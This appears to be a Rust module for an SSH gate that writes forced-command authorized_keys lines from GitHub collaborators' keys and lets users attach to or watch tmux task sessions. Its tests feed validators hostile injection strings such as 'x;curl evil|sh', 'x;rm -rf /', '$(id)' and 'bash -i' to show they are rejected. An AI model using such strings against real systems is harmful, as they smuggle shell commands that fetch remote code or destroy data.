//! Who may step into sessions, and the SSH gate they come through.
//!
//! `forge keys` writes the session user's authorized_keys from the GitHub keys
//! of the repo's members and collaborators who can push, each line forced to
//! `forge attach-gate <login>`. The gate reads SSH_ORIGINAL_COMMAND:
//! "attach <owner/repo> <n>" joins the task's live tmux session (tmux.rs),
//! "watch <owner/repo> <n>" views it read-only. Being in the key list is the
//! permission; the gate needs nothing from the daemon.

use std::collections::BTreeSet;
use std::io::Write as _;
use std::os::unix::fs::OpenOptionsExt as _;
use std::os::unix::process::CommandExt as _;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use reqwest::StatusCode;

use crate::config::Config;
use crate::github::GitHubApi;
use crate::tmux::session_name;

/// Where `forge keys` reads each login's public keys.
const KEYS_BASE: &str = "https://github.com";

/// A GitHub login: letters, digits and '-', not leading '-', at most 39 long.
pub(crate) fn valid_login(login: &str) -> bool {
    (1..=39).contains(&login.len())
        && !login.starts_with('-')
        && login.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
}

/// "owner/repo" in GitHub's characters.
pub(crate) fn valid_repo(name: &str) -> bool {
    let Some((owner, repo)) = name.split_once('/') else { return false };
    valid_login(owner)
        && (1..=100).contains(&repo.len())
        && repo != "."
        && repo != ".."
        && !repo.starts_with('-')
        && repo.bytes().all(|b| b.is_ascii_alphanumeric() || b"-_.".contains(&b))
}

/// One authorized_keys line: `command="<forge_bin> attach-gate <login>",restrict,pty <key>`.
/// The login goes into a shell command, so it must be a valid GitHub login;
/// the key is put on one line.
pub fn authorized_keys_line(forge_bin: &Path, login: &str, key: &str) -> String {
    assert!(valid_login(login), "not a GitHub login: {login:?}");
    let key = key.split_whitespace().collect::<Vec<_>>().join(" ");
    format!("command=\"{} attach-gate {login}\",restrict,pty {key}", forge_bin.display())
}

/// Reads "attach <owner/repo> <n>"; anything else is None.
pub fn parse_gate_command(original: &str) -> Option<(String, u64)> {
    parse_verb(original, "attach")
}

/// Reads "watch <owner/repo> <n>"; anything else is None.
pub fn parse_watch_command(original: &str) -> Option<(String, u64)> {
    parse_verb(original, "watch")
}

fn parse_verb(original: &str, verb: &str) -> Option<(String, u64)> {
    let mut parts = original.split(' ');
    let (Some(word), Some(repo), Some(n), None) = (parts.next(), parts.next(), parts.next(), parts.next()) else {
        return None;
    };
    if word != verb {
        return None;
    }
    if !valid_repo(repo) || !n.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    let issue: u64 = n.parse().ok().filter(|&i| i > 0)?;
    Some((repo.to_string(), issue))
}

/// Writes authorized_keys for every member and every collaborator who can push
/// of every configured repo (keys from https://github.com/<login>.keys),
/// atomically. Returns the count. Members are added by name: GitHub doesn't
/// list org owners as an App's repo collaborators.
pub async fn sync_keys(cfg: &Config, gh: &dyn GitHubApi, out: &Path) -> Result<usize> {
    sync_keys_from(cfg, gh, out, KEYS_BASE).await
}

async fn sync_keys_from(cfg: &Config, gh: &dyn GitHubApi, out: &Path, keys_base: &str) -> Result<usize> {
    let mut logins = BTreeSet::new();
    for repo in &cfg.repos {
        let found = gh.collaborators(&repo.name).await.with_context(|| format!("collaborators of {}", repo.name))?;
        logins.extend(found);
        logins.extend(repo.members.iter().map(|m| m.github.clone()));
    }
    let http = reqwest::Client::builder().timeout(Duration::from_secs(30)).build()?;
    let mut lines = Vec::new();
    for login in &logins {
        if !valid_login(login) {
            tracing::warn!(login = ?login, "skipping a login GitHub wouldn't issue");
            continue;
        }
        for key in fetch_keys(&http, keys_base, login).await? {
            lines.push(authorized_keys_line(&cfg.claude.forge_bin, login, &key));
        }
    }
    write_private(out, &lines)?;
    Ok(lines.len())
}

/// A login's public keys, one per line; none for an unknown login.
async fn fetch_keys(http: &reqwest::Client, base: &str, login: &str) -> Result<Vec<String>> {
    let resp = http
        .get(format!("{base}/{login}.keys"))
        .send()
        .await
        .with_context(|| format!("fetching {login}'s keys"))?;
    if resp.status() == StatusCode::NOT_FOUND {
        return Ok(Vec::new());
    }
    let body = resp.error_for_status()?.text().await?;
    Ok(body.lines().map(str::trim).filter(|k| !k.is_empty()).map(String::from).collect())
}

/// Writes the lines to a mode-600 temp file beside `out`, then renames it over `out`.
fn write_private(out: &Path, lines: &[String]) -> Result<()> {
    let name = out.file_name().context("--out needs a file name")?;
    let tmp = out.with_file_name(format!(".{}.tmp", name.to_string_lossy()));
    let _ = std::fs::remove_file(&tmp);
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&tmp)
        .with_context(|| format!("writing {}", tmp.display()))?;
    for line in lines {
        writeln!(file, "{line}")?;
    }
    file.sync_all()?;
    std::fs::rename(&tmp, out).with_context(|| format!("replacing {}", out.display()))?;
    Ok(())
}

/// The SSH forced command. Returns the exit code if tmux couldn't take over.
pub async fn attach_gate(cfg: &Config, login: &str) -> Result<i32> {
    let original = std::env::var("SSH_ORIGINAL_COMMAND").unwrap_or_default();
    let Some(args) = gate_args(cfg, login, &original) else {
        eprintln!("usage: ssh -t <forge host> attach|watch <owner/repo> <issue>");
        return Ok(2);
    };
    let (repo, issue) = parse_gate_command(&original).or_else(|| parse_watch_command(&original)).unwrap_or_default();
    let has = std::process::Command::new("tmux")
        .args(["-S", &cfg.tmux_socket().display().to_string(), "has-session", "-t", &format!("={}", session_name(&repo, issue))])
        .stderr(std::process::Stdio::null())
        .status();
    if !has.is_ok_and(|s| s.success()) {
        eprintln!("No live session for #{issue}: Forge hasn't started one yet, or the task is done.");
        return Ok(1);
    }
    let err = std::process::Command::new("tmux").args(&args).exec();
    eprintln!("starting tmux: {err}");
    Ok(1)
}

/// The tmux arguments for a gate command: `attach` joins the task's session,
/// `watch` views it read-only. None for anything else.
fn gate_args(cfg: &Config, login: &str, original: &str) -> Option<Vec<String>> {
    if !valid_login(login) {
        return None;
    }
    let (read_only, (repo, issue)) = match (parse_gate_command(original), parse_watch_command(original)) {
        (Some(found), _) => (false, found),
        (_, Some(found)) => (true, found),
        _ => return None,
    };
    let mut args = vec!["-S".to_string(), cfg.tmux_socket().display().to_string(), "attach".into()];
    if read_only {
        args.push("-r".into());
    }
    args.extend(["-t".into(), format!("={}", session_name(&repo, issue))]);
    Some(args)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{IssueThread, ProjectItem, PullRequest, Status};
    use async_trait::async_trait;
    use axum::extract::Path as UrlPath;
    use axum::http::StatusCode as Code;
    use axum::routing::get;
    use axum::Router;
    use std::os::unix::fs::PermissionsExt as _;

    async fn serve(app: Router) -> String {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
        addr.to_string()
    }

    #[test]
    fn keys_lines_force_the_gate() {
        let bin = Path::new("/usr/local/bin/forge");
        assert_eq!(
            authorized_keys_line(bin, "bob-gh", "  ssh-ed25519 AAAAC3Nz bob@laptop \n"),
            "command=\"/usr/local/bin/forge attach-gate bob-gh\",restrict,pty ssh-ed25519 AAAAC3Nz bob@laptop"
        );
        let one_line = authorized_keys_line(bin, "a", "ssh-rsa AAAA\nssh-rsa BBBB");
        assert_eq!(one_line.lines().count(), 1);
    }

    #[test]
    #[should_panic(expected = "not a GitHub login")]
    fn keys_line_refuses_shell_in_login() {
        authorized_keys_line(Path::new("/f"), "x;curl evil|sh", "ssh-ed25519 AAAA");
    }

    #[test]
    fn logins_and_repos_follow_github() {
        for good in ["a", "bob-gh", "A1-b2", &"x".repeat(39)] {
            assert!(valid_login(good), "{good}");
        }
        for bad in ["", "-a", "a b", "a;b", "a$(x)", "a/b", "ä", "x[bot]", &"x".repeat(40)] {
            assert!(!valid_login(bad), "{bad}");
        }
        for good in ["example-team/shop", "o/.github", "o/a_b.c-d"] {
            assert!(valid_repo(good), "{good}");
        }
        for bad in ["shop", "o/", "/r", "o/r/x", "o/..", "o/.", "o/-r", "o/r r", "-o/r", "o/r;ls"] {
            assert!(!valid_repo(bad), "{bad}");
        }
    }

    #[test]
    fn gate_reads_only_attach() {
        assert_eq!(parse_gate_command("attach example-team/shop 412"), Some(("example-team/shop".into(), 412)));
        assert_eq!(parse_watch_command("watch example-team/shop 412"), Some(("example-team/shop".into(), 412)));
        assert_eq!(parse_watch_command("attach example-team/shop 412"), None);
        assert_eq!(parse_gate_command("watch example-team/shop 412"), None);
        for hostile in [
            "",
            "attach",
            "attach example-team/shop",
            "attach example-team/shop 412 extra",
            "attach  example-team/shop 412",
            "attach example-team/shop 412\n",
            "attach example-team/shop +412",
            "attach example-team/shop 0",
            "attach example-team/shop -1",
            "attach example-team/shop 99999999999999999999",
            "attach ../../etc 412",
            "attach example-team/shop;sh 412",
            "attach example-team/shop $(id)",
            "bash -i",
            "scp -t /tmp",
            "ATTACH example-team/shop 412",
        ] {
            assert_eq!(parse_gate_command(hostile), None, "{hostile:?}");
        }
    }

    struct FakeGh(Vec<String>);

    #[async_trait]
    impl GitHubApi for FakeGh {
        async fn project_items(&self, _: &crate::config::RepoConfig) -> Result<Vec<ProjectItem>> {
            unimplemented!()
        }
        async fn set_status(&self, _: &crate::config::RepoConfig, _: &str, _: Status) -> Result<()> {
            unimplemented!()
        }
        async fn issue_thread(&self, _: &str, _: u64) -> Result<IssueThread> {
            unimplemented!()
        }
        async fn comment(&self, _: &str, _: u64, _: &str) -> Result<u64> {
            unimplemented!()
        }
        async fn create_issue(&self, _: &str, _: &str, _: &str, _: &[String]) -> Result<u64> {
            unimplemented!()
        }
        async fn open_or_update_pr(&self, _: &str, _: &str, _: &str, _: &str, _: &str) -> Result<PullRequest> {
            unimplemented!()
        }
        async fn merge_pr(&self, _: &str, _: u64, _: &str, _: &str) -> Result<()> {
            unimplemented!()
        }
        async fn git_token(&self) -> Result<String> {
            unimplemented!()
        }
        async fn collaborators(&self, repo: &str) -> Result<Vec<String>> {
            assert_eq!(repo, "example-team/shop");
            Ok(self.0.clone())
        }
    }

    async fn keys_server() -> String {
        let app = Router::new().route(
            "/:file",
            get(|UrlPath(file): UrlPath<String>| async move {
                match file.as_str() {
                    "alice.keys" => Ok("ssh-ed25519 AAAAalice alice@laptop\n\nssh-rsa AAAAalice2\n".to_string()),
                    "bob.keys" => Ok(String::new()),
                    "dave.keys" => Err(Code::INTERNAL_SERVER_ERROR),
                    _ => Err(Code::NOT_FOUND),
                }
            }),
        );
        format!("http://{}", serve(app).await)
    }

    #[tokio::test]
    async fn sync_keys_writes_atomically_and_privately() {
        let base = keys_server().await;
        let cfg = crate::config::sample();
        let tmp = tempfile::tempdir().unwrap();
        let out = tmp.path().join("authorized_keys");
        std::fs::write(&out, "old\n").unwrap();
        std::fs::set_permissions(&out, std::fs::Permissions::from_mode(0o644)).unwrap();

        let gh = FakeGh(["alice", "bob", "carol", "x;rm -rf /", "alice"].map(String::from).to_vec());
        assert_eq!(sync_keys_from(&cfg, &gh, &out, &base).await.unwrap(), 2);
        let text = std::fs::read_to_string(&out).unwrap();
        assert_eq!(
            text,
            "command=\"/usr/local/bin/forge attach-gate alice\",restrict,pty ssh-ed25519 AAAAalice alice@laptop\n\
             command=\"/usr/local/bin/forge attach-gate alice\",restrict,pty ssh-rsa AAAAalice2\n"
        );
        assert_eq!(std::fs::metadata(&out).unwrap().permissions().mode() & 0o777, 0o600);
        let names: Vec<_> = std::fs::read_dir(tmp.path()).unwrap().map(|e| e.unwrap().file_name()).collect();
        assert_eq!(names, vec!["authorized_keys"]);

        let failing = FakeGh(["alice", "dave"].map(String::from).to_vec());
        assert!(sync_keys_from(&cfg, &failing, &out, &base).await.is_err());
        assert_eq!(std::fs::read_to_string(&out).unwrap(), text);
    }

    #[tokio::test]
    async fn sync_keys_includes_members_github_doesnt_list() {
        let base = keys_server().await;
        let mut cfg = crate::config::sample();
        cfg.repos[0].members[0].github = "alice".into();
        let tmp = tempfile::tempdir().unwrap();
        let out = tmp.path().join("authorized_keys");

        assert_eq!(sync_keys_from(&cfg, &FakeGh(vec![]), &out, &base).await.unwrap(), 2);
        assert!(std::fs::read_to_string(&out).unwrap().starts_with("command=\"/usr/local/bin/forge attach-gate alice\""));
    }

    #[test]
    fn gate_attaches_or_watches_the_tasks_tmux_session() {
        let cfg = crate::config::sample();
        let sock = cfg.tmux_socket().display().to_string();
        assert_eq!(
            gate_args(&cfg, "alice", "attach example-team/shop 412").unwrap(),
            ["-S", &sock, "attach", "-t", "=example-team-shop-412"]
        );
        assert_eq!(gate_args(&cfg, "alice", "watch example-team/shop 412").unwrap()[2..4], ["attach", "-r"]);
        assert_eq!(gate_args(&cfg, "alice", ""), None);
        assert_eq!(gate_args(&cfg, "alice", "bash -c id"), None);
        assert_eq!(gate_args(&cfg, "a;b", "attach example-team/shop 412"), None);
    }
}
